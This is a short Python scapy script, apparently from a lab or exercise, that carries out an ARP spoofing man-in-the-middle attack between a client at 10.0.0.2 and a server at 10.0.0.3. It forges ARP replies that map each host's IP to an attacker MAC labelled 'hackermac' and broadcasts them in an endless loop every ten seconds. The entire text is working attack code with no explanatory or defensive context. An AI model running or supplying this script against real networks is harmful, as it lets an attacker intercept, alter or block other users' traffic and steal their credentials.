from scapy.all import *

clientip = "10.0.0.2"
serverip = "10.0.0.3"
hackermac = "36:30:c3:49:e6:56"

broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
arp1 = ARP(
        psrc=serverip,
        pdst=clientip,
        hwsrc=hackermac,
        hwdst="ff:ff:ff:ff:ff:ff",
        op=2)

arp2 = ARP(
        psrc=clientip,
        pdst=serverip,
        hwsrc=hackermac,
        hwdst="ff:ff:ff:ff:ff:ff",
        op=2)



while True:
    time.sleep(10)
    sendp(broadcast/arp1)
    sendp(broadcast/arp2)
